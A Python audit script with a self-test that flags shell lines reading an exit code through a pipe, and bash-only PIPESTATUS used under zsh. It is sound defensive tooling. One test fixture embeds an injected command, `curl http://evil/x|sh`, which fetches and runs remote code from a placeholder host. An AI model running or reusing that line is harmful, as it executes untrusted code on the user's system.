#!/usr/bin/env python3
"""
rc-through-pipe-audit.py -- the control behind a warning that kept not being one.

THE SPECIES
    cmd | tail -1; echo $?     -> prints TAIL's exit code (always 0)  [rc-audit: ok]
    cmd | grep -c UNMET                                              [rc-audit: ok]
    echo $?                    -> the same bug over two lines: the DOC form

An exit code read through a pipe is how a green gets reported that was never
earned. Three sessions in a row walked into this on paints-and-sticks because
the warning lived in prose, and prose is not a control. This is the control.

WHAT COUNTS AS A PIPE  (shell semantics, not grep semantics)
    Only a BARE, top-level `|` counts. A pipe inside quotes is text; a pipe
    inside $(...) or backticks belongs to the substitution, whose exit code IS
    its last command -- so `OUT=$(printf x | tool); RC=$?` is CORRECT and this
    tool says so.

It also flags the mirror-image trap: ${PIPESTATUS[0]} is a BASHISM. Under zsh
it expands to the EMPTY STRING (zsh spells it $pipestatus, 1-indexed), so the
"fix" silently reports nothing at all.

OPT-OUT, when the pipeline's LAST command really is the assertion:
    put   rc-audit: ok   in a comment on the line or the line above, and say
    WHY in the same comment. (markdown: <!-- rc-audit: ok -->)

EXIT CODES  (load-bearing -- and do not read them through a pipe)
    0  clean
    1  violations found
    2  usage error / no readable roots
    3  --selftest failed: the detector itself is wrong
"""
import argparse
import os
import re
import sys

DEFAULT_ROOTS = ["~/repos", "~/code", "~/Scripts", "~/Desktop/downloads"]

SKIP_DIRS = {
    ".git", ".hg", ".svn", "node_modules", ".venv", "venv", "env",
    "__pycache__", "dist", "build", "vendor", ".mypy_cache", ".pytest_cache",
    "site-packages", ".next", ".cache", ".tox", ".eggs", "coverage",
    "htmlcov", ".terraform", "worktrees", ".worktrees", "quarantine",
}

SCAN_EXT = {".sh", ".bash", ".zsh", ".ksh", ".md", ".markdown", ".txt",
            ".rst", ".py", ".yml", ".yaml"}
DOC_EXT = {".md", ".markdown", ".txt", ".rst"}

MAX_BYTES = 2_000_000

OPTOUT_RE = re.compile(r"rc-audit:\s*ok", re.I)
COMMENT_RE = re.compile(r"^\s*(?:#|//|<!--|\*)")
OPTOUT_LOOKBACK = 6
# $? -- but not a regex's literal \$?
RC_READ_RE = re.compile(r"(?<!\\)\$\?|(?<!\\)\$\{\?\}")
# a line whose whole job is to read $? (no command of its own to reset it first)
NEXT_LINE_RC_RE = re.compile(
    r"^\s*(?:[$#>]\s+)?(?:"
    r"(?:echo|printf|print|exit|return)\b[^|;&]*(?<!\\)\$\?"
    r"|[A-Za-z_][A-Za-z0-9_]*=(?<!\\)\$\?\s*(?:[#;].*)?$"
    r"|(?:if|test|\[\[?)\s[^|]*(?<!\\)\$\?"
    r")"
)
PIPESTATUS_RE = re.compile(r"\$\{?PIPESTATUS\[")
LC_PIPESTATUS_RE = re.compile(r"\$\{?pipestatus\[")
PIPEFAIL_RE = re.compile(r"pipefail")
# `set -o pipefail` AT TOP LEVEL and BEFORE the line genuinely fixes the semantics: the
# pipeline's status becomes the rightmost non-zero, so `cmd | report; exit $?` does propagate
# cmd's failure. Flagging that is crying wolf on correct shell -- and a check that fires on the
# weather is a check people learn to skip, which this file's own G-AO write-up says out loud.
# Heuristic and deliberately erring toward SUPPRESSING: `set` must be at column 0-2, so a
# pipefail set inside an indented function body does not count. Suppressed hits are still
# counted and listable under --all; they never become invisible.
TOP_PIPEFAIL_RE = re.compile(r"^ {0,2}set\b[^#]*pipefail")
FENCE_RE = re.compile(r"^\s*(?:```|~~~)")
# prose that names the pattern as WRONG -- a lesson card, not a recipe
WARNS_RE = re.compile(
    r"never|not the |masks|swallow|wrong|mistake|gotcha|anti-?pattern|"
    r"footgun|trap|bit me|do not |don't|instead|always 0|"
    r"through a pipe|reports .{0,12}(tail|head|sed|grep)|"
    r"\btail's\b|\bhead's\b|ate the exit|pipe swallow|false positive",
    re.I,
)
WARN_WINDOW = 8


MD_TABLE_RE = re.compile(r"^\s*\|.*\|\s*$")


def bare_pipe_indices(line, doc_mode=False):
    """Indices of top-level `|` -- outside quotes, outside $(..) and backticks,
    and not part of || or |&. This is the only kind that steals $?.

    doc_mode: in markdown, backticks are inline code (transparent) and an
    apostrophe in prose ("tail's") is not a shell quote. A table row is a
    table row."""
    if doc_mode:
        if MD_TABLE_RE.match(line) and line.count("|") >= 2:
            return []
        return _doc_pipe_indices(line)
    out = []
    i = 0
    n = len(line)
    sq = dq = False          # inside '...' / "..."
    depth = 0                # $( ) nesting
    btick = False
    while i < n:
        c = line[i]
        if c == "\\" and not sq:
            i += 2
            continue
        if sq:
            if c == "'":
                sq = False
            i += 1
            continue
        if c == "'" and not dq:
            sq = True
            i += 1
            continue
        if c == '"':
            dq = not dq
            i += 1
            continue
        if c == "`":
            btick = not btick
            i += 1
            continue
        if c == "$" and i + 1 < n and line[i + 1] == "(":
            depth += 1
            i += 2
            continue
        if c == ")" and depth > 0:
            depth -= 1
            i += 1
            continue
        if c == "|" and not dq and depth == 0 and not btick:
            if line[i - 1:i] == "|" or line[i + 1:i + 2] in ("|", "&"):
                i += 1
                continue
            out.append(i)
        i += 1
    return out


def _doc_pipe_indices(line):
    out = []
    depth = 0
    i = 0
    n = len(line)
    while i < n:
        c = line[i]
        if c == "$" and line[i + 1:i + 2] == "(":
            depth += 1
            i += 2
            continue
        if c == ")" and depth > 0:
            depth -= 1
            i += 1
            continue
        if c == "|" and depth == 0:
            if line[i - 1:i] == "|" or line[i + 1:i + 2] in ("|", "&"):
                i += 1
                continue
            out.append(i)
        i += 1
    return out


def has_substituted_pipe(line):
    """A pipe that lives inside $(...) or backticks -- correct to read $? from."""
    stripped = re.sub(r"'[^']*'", "", line)
    return ("|" in stripped) and (("$(" in stripped) or ("`" in stripped))


def separator_after(line, idx):
    """A `;` or `&&` after idx that starts a NEW command (top level)."""
    m = re.search(r";|&&", line[idx:])
    return idx + m.end() if m else None


def is_binary(path):
    try:
        with open(path, "rb") as fh:
            return b"\x00" in fh.read(4096)
    except OSError:
        return True


def is_shellish_shebang(path):
    try:
        with open(path, "rb") as fh:
            first = fh.readline(200).decode("utf-8", "replace")
    except OSError:
        return False
    return first.startswith("#!") and re.search(r"\b(sh|bash|zsh|ksh)\b", first) is not None


def shell_flavor(lines):
    if lines:
        m = re.match(r"#!.*\b(bash|zsh|ksh|dash|sh)\b", lines[0])
        if m:
            return m.group(1)
    return None


def want_file(path, name):
    ext = os.path.splitext(name)[1].lower()
    if ext in SCAN_EXT:
        return not is_binary(path)
    if ext == "":
        return is_shellish_shebang(path) and not is_binary(path)
    return False


def walk(roots):
    for root in roots:
        root = os.path.expanduser(root)
        if not os.path.isdir(root):
            continue
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames
                           if d not in SKIP_DIRS and not d.startswith(".git")]
            for name in filenames:
                path = os.path.join(dirpath, name)
                if os.path.islink(path):
                    continue
                try:
                    if os.path.getsize(path) > MAX_BYTES:
                        continue
                except OSError:
                    continue
                if want_file(path, name):
                    yield path


LESSONS_PATH_RE = re.compile(r"(^|/)lessons/")


def pipefail_before(lines, i):
    """Is `set -o pipefail` in effect at top level by the time we reach line i?"""
    for j in range(i):
        if TOP_PIPEFAIL_RE.match(lines[j].rstrip("\n")):
            return True
    return False


def opted_out(lines, i):
    """The marker on this line, or anywhere in the contiguous comment block
    directly above it -- a justification worth writing runs to a paragraph."""
    if OPTOUT_RE.search(lines[i]):
        return True
    j = i - 1
    seen = 0
    while j >= 0 and seen < OPTOUT_LOOKBACK:
        prev = lines[j]
        if OPTOUT_RE.search(prev):
            return True
        if not COMMENT_RE.match(prev):
            return seen == 0 and False
        j -= 1
        seen += 1
    return False


def quoted_as_wrong(lines, i, is_doc, path=""):
    """In a DOC only: is this hit surrounded by prose naming it as the bug?

    A card under a lessons/ directory is quote context by construction -- the
    shelf is a catalogue of failures, and nothing there is ever executed."""
    if not is_doc:
        return False
    if LESSONS_PATH_RE.search(path):
        return True
    lo = max(0, i - WARN_WINDOW)
    hi = min(len(lines), i + WARN_WINDOW + 1)
    return any(WARNS_RE.search(lines[j]) for j in range(lo, hi))


def scan_lines(lines, is_doc=False, path=""):
    """Yield (lineno, kind, text). kind in VIOLATION / SUBST-LAST / QUOTED."""
    for i, raw in enumerate(lines):
        line = raw.rstrip("\n")
        if not line.strip() or FENCE_RE.match(line):
            continue
        if opted_out(lines, i):
            continue
        if PIPESTATUS_RE.search(line) or LC_PIPESTATUS_RE.search(line):
            continue

        work = line.replace("`", " ") if is_doc else line
        bars = bare_pipe_indices(work, doc_mode=is_doc)

        # --- form A: bare pipeline, then a NEW command reading $? on the same line
        if bars:
            sep = separator_after(work, bars[-1])
            if sep is not None and RC_READ_RE.search(work[sep:]):
                if quoted_as_wrong(lines, i, is_doc, path):
                    kind = "QUOTED"
                elif not is_doc and pipefail_before(lines, i):
                    kind = "PIPEFAIL-OK"
                else:
                    kind = "VIOLATION"
                yield (i + 1, kind, line)
                continue

        # --- form B: bare pipeline here, next code line's whole job is reading $?
        if bars and not RC_READ_RE.search(work):
            j = i + 1
            while j < len(lines) and not lines[j].strip():
                j += 1
            if j < len(lines):
                nxt = lines[j].rstrip("\n")
                if is_doc:
                    nxt = nxt.replace("`", " ")
                if OPTOUT_RE.search(nxt):
                    continue
                if PIPESTATUS_RE.search(nxt) or LC_PIPESTATUS_RE.search(nxt):
                    continue
                if NEXT_LINE_RC_RE.match(nxt) and "$(" not in nxt.split("$?")[0]:
                    if quoted_as_wrong(lines, i, is_doc, path):
                        kind = "QUOTED"
                    elif not is_doc and pipefail_before(lines, i):
                        kind = "PIPEFAIL-OK"
                    else:
                        kind = "VIOLATION"
                    yield (i + 1, kind, line + "  [next] " + nxt.strip())
                    continue

        # --- informational: the pipe is inside $(..) so $? is the tool's. Correct.
        if not bars and has_substituted_pipe(work) and RC_READ_RE.search(work):
            yield (i + 1, "SUBST-LAST", line)


def scan_pipestatus(lines):
    """${PIPESTATUS[0]} in a file zsh/sh will run == the empty string."""
    if shell_flavor(lines) in (None, "bash", "ksh"):
        return
    for i, raw in enumerate(lines):
        if PIPESTATUS_RE.search(raw) and not OPTOUT_RE.search(raw):
            yield (i + 1, "ZSH-PIPESTATUS", raw.rstrip("\n"))


def audit(roots):
    findings = []
    scanned = 0
    for path in walk(roots):
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as fh:
                lines = fh.readlines()
        except OSError:
            continue
        scanned += 1
        is_doc = os.path.splitext(path)[1].lower() in DOC_EXT
        pipefail = any(PIPEFAIL_RE.search(l) for l in lines)
        for lineno, kind, text in scan_lines(lines, is_doc, path):
            findings.append((path, lineno, kind, text, pipefail))
        for lineno, kind, text in scan_pipestatus(lines):
            findings.append((path, lineno, kind, text, pipefail))
    return findings, scanned


# ------------------------------------------------------------------ selftest
BAD = [
    (["cmd | tail -1; echo $?"], "VIOLATION"),
    (["~/Scripts/w.sh | tail -25 && echo $?"], "VIOLATION"),
    (["python3 tool.py --audit | head -40 ; rc=$?"], "VIOLATION"),
    (["make test | tee out.log", "echo $?"], "VIOLATION"),
    (["    ./gate.sh | grep -c UNMET", "    echo $?"], "VIOLATION"),
    (["python3 r.py 2>&1 | sed -n '1,60p'", 'echo "rc=$?"'], "VIOLATION"),
    (["cmd | tail -1", "if [ $? -ne 0 ]; then exit 1; fi"], "VIOLATION"),
]
GOOD = [
    ["cmd >/dev/null 2>&1; echo $?"],
    ["cmd | tail -1; echo ${PIPESTATUS[0]}"],
    ["cmd | tail -1; echo $?   # rc-audit: ok - tail IS the assertion"],
    ["| Command | Meaning |"],
    ["echo 'a|b'; echo $?"],
    ["cmd_one | cmd_two"],
    ["cmd >out.txt", "echo $?"],
    ["cmd | tail -1", "some_other_command --flag"],
    # $? belongs to the substitution, whose last command is the tool: correct
    ['OUT=$(printf x | python3 tool.py 2>&1); RC=$?'],
    ['RPT="$(printf %s "$PW" | python3 rep.py 2>&1)"', "if [ $? -ne 0 ]; then :; fi"],
    ['OUT=$(run "ban 1.2.3.4; curl http://evil/x|sh"); RC=$?'],
    # a regex containing a literal \$? is not an exit-code read
    [r'A=re.compile(r"(a|b)")', r'B=re.compile(r"approved for \$?[0-9]+")'],
]
DOC_QUOTED = [
    ["A pipeline masks the exit code you are testing:",
     "`python3 tool.py | tail -5; echo $?` reports `tail`'s status."],
]


def _kinds(lines, is_doc=False, path=""):
    return [k for _, k, _ in scan_lines([l + "\n" for l in lines], is_doc, path)]


def _e2e(fails):
    """The unit arms test scan_lines(). This tests the LIVE PATH: walk a real
    directory, classify real files, return the exit code the gate reads."""
    import tempfile
    with tempfile.TemporaryDirectory() as d:
        bad = os.path.join(d, "verify.sh")
        with open(bad, "w") as fh:
            fh.write("#!/bin/bash\npython3 sweep.py 2>&1 | tail -20\necho \"rc=$?\"\n")
        found, scanned = audit([d])
        if not [f for f in found if f[2] == "VIOLATION"]:
            fails.append("E2E: a planted violation in a real directory was NOT found "
                         "(scanned %d file(s))" % scanned)
        if scanned < 1:
            fails.append("E2E: the walker scanned 0 files -- it would certify anything")
        os.remove(bad)
        with open(os.path.join(d, "ok.sh"), "w") as fh:
            fh.write("#!/bin/bash\npython3 sweep.py >/tmp/o 2>&1; rc=$?\ntail -20 /tmp/o\n"
                     "OUT=$(printf x | python3 t.py); RC=$?\n")
        found, _ = audit([d])
        if [f for f in found if f[2] == "VIOLATION"]:
            fails.append("E2E: cried wolf on a directory of correct idioms: %s" % found)
    # a root that is not there must FAIL CLOSED (exit 2), never certify an empty sweep
    if main_rc(["/nonexistent/root/%s" % os.getpid()]) != 2:
        fails.append("E2E: a missing root did not return 2 -- an empty sweep would read as clean")


def roots_unreadable(roots):
    """No root is there -> fail CLOSED. An empty sweep must never read as clean."""
    return not any(os.path.isdir(os.path.expanduser(r)) for r in roots)


def is_violation(f):
    return f[2] in ("VIOLATION", "ZSH-PIPESTATUS")


def main_rc(roots):
    """main()'s verdict for a given root list, without argparse. Used by the e2e
    arm so the drill executes the LIVE rule rather than a copy of it."""
    if roots_unreadable(roots):
        return 2
    findings, _ = audit(roots)
    return 1 if [f for f in findings if is_violation(f)] else 0


def selftest():
    fails = []
    for lines, want in BAD:
        got = _kinds(lines)
        if want not in got:
            fails.append("MISSED %s: %r -> %s" % (want, lines, got or "nothing"))
    for lines in GOOD:
        got = [k for k in _kinds(lines) if k in ("VIOLATION",)]
        if got:
            fails.append("FALSE POSITIVE: %r -> %s" % (lines, got))
    for lines in DOC_QUOTED:
        got = _kinds(lines, is_doc=True)
        if "QUOTED" not in got:
            fails.append("MISCLASSIFIED (want QUOTED): %r -> %s" % (lines, got or "nothing"))
    # the same leniency must NOT excuse a live line in a script, however loudly
    # the comment above it warns
    warned_script = ["# never read an exit code through a pipe: it reports tail's status",
                     "cmd | tail -1; echo $?"]
    got_script = _kinds(warned_script, is_doc=False)
    if "VIOLATION" not in got_script:
        fails.append("QUOTED leniency leaked into a SCRIPT: %r -> %s"
                     % (warned_script, got_script or "nothing"))
    pf_ok = ["#!/bin/bash", "set -uo pipefail", "audit x | report", "exit $?"]
    if "VIOLATION" in _kinds(pf_ok):
        fails.append("top-level pipefail before the line should NOT be a violation")
    if "PIPEFAIL-OK" not in _kinds(pf_ok):
        fails.append("top-level pipefail hit was not classified PIPEFAIL-OK")
    pf_late = ["#!/bin/bash", "audit x | report", "exit $?", "set -uo pipefail"]
    if "VIOLATION" not in _kinds(pf_late):
        fails.append("pipefail set AFTER the line must not excuse it")
    pf_fn = ["#!/bin/bash", "f(){", "    set -uo pipefail", "}", "audit x | report", "exit $?"]
    if "VIOLATION" not in _kinds(pf_fn):
        fails.append("pipefail set inside an indented function body must not excuse a top-level line")

    block = ["# python3 is the LAST command in this pipeline, so $? is its code.",
             "# The credential rides on stdin.   rc-audit: ok",
             'printf %s "$PW" | python3 "$PY"', "exit $?"]
    if _kinds(block):
        fails.append("opt-out in a comment BLOCK above the line was not honoured")
    noblock = ['printf %s "$PW" | python3 "$PY"', "exit $?"]
    if "VIOLATION" not in _kinds(noblock):
        fails.append("same lines WITHOUT the marker should still be a VIOLATION")

    card = ["A registry must refuse '|', ';' and '&': $? is the LAST command's."]
    if "QUOTED" not in _kinds(card, is_doc=True, path="/r/claude-blackbook/lessons/global/x.md"):
        fails.append("lessons/ card not treated as quote context")
    if "VIOLATION" not in _kinds(card, is_doc=True, path="/r/other/docs/x.md"):
        fails.append("lessons/ leniency leaked outside lessons/")

    if not list(scan_pipestatus(["#!/bin/zsh\n", "cmd | tail -1\n", "echo ${PIPESTATUS[0]}\n"])):
        fails.append("MISSED ZSH-PIPESTATUS in a zsh script")
    if list(scan_pipestatus(["#!/bin/bash\n", "cmd | tail -1\n", "echo ${PIPESTATUS[0]}\n"])):
        fails.append("FALSE POSITIVE ZSH-PIPESTATUS in a bash script")

    _e2e(fails)

    if fails:
        print("SELFTEST FAILED -- the detector is wrong; do not trust its green:")
        for f in fails:
            print("  x " + f)
        return 3
    print("selftest PASS -- %d traps caught, %d correct idioms left alone, "
          "doc-quote/zsh/opt-out arms both ways, and the live walk goes red on a "
          "planted file, quiet on a clean one, and 2 on a missing root"
          % (len(BAD) + 1, len(GOOD) + 1))
    return 0


HOWTO = """
  THE FIX, in order of preference:
    1. run it bare, look at the output separately
         cmd >/tmp/out 2>&1; rc=$?; tail -25 /tmp/out
    2. bash only, and say #!/bin/bash out loud:
         cmd | tail -1; rc=${PIPESTATUS[0]}
       ${PIPESTATUS[0]} is EMPTY under zsh -- zsh spells it $pipestatus, 1-indexed.
    3. the pipeline's LAST command really is the assertion? Then say so:
         cmd | grep -q FOO; rc=$?   # rc-audit: ok - grep's verdict is the assertion
"""


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("roots", nargs="*", default=None,
                    help="paths to scan (default: %s)" % " ".join(DEFAULT_ROOTS))
    ap.add_argument("--selftest", action="store_true",
                    help="prove the detector still catches what it claims to")
    ap.add_argument("--all", action="store_true",
                    help="also list the non-violation classes it suppressed")
    args = ap.parse_args()

    if args.selftest:
        return selftest()

    roots = args.roots or DEFAULT_ROOTS
    if roots_unreadable(roots):
        print("no readable roots among: %s" % " ".join(roots), file=sys.stderr)
        return 2

    findings, scanned = audit(roots)
    viol = [f for f in findings if is_violation(f)]
    other = [f for f in findings if f not in viol]

    if args.all and other:
        print("--- suppressed (not violations) ---")
        for path, lineno, kind, text, _ in sorted(other):
            print("%s:%d  %s\n    %s" % (path, lineno, kind, text.strip()[:180]))
        print()

    if not viol:
        print("rc-through-pipe-audit: clean -- %d files, 0 exit codes read through a pipe"
              % scanned)
        if other:
            print("  (%d suppressed: %d quoted-as-wrong in docs, %d $(subst) reads that are "
                  "correct, %d under a top-level `set -o pipefail` -- see --all)"
                  % (len(other),
                     sum(1 for f in other if f[2] == "QUOTED"),
                     sum(1 for f in other if f[2] == "SUBST-LAST"),
                     sum(1 for f in other if f[2] == "PIPEFAIL-OK")))
        return 0

    print("rc-through-pipe-audit: %d VIOLATION(s) across %d files\n" % (len(viol), scanned))
    for path, lineno, kind, text, pipefail in sorted(viol):
        note = "  [file sets pipefail]" if pipefail and kind != "ZSH-PIPESTATUS" else ""
        print("%s:%d  %s%s" % (path, lineno, kind, note))
        print("    %s" % text.strip()[:200])
    if other:
        print("\n  (%d further hit(s) suppressed as not-a-bug -- see --all)" % len(other))
    print(HOWTO)
    return 1


if __name__ == "__main__":
    sys.exit(main())
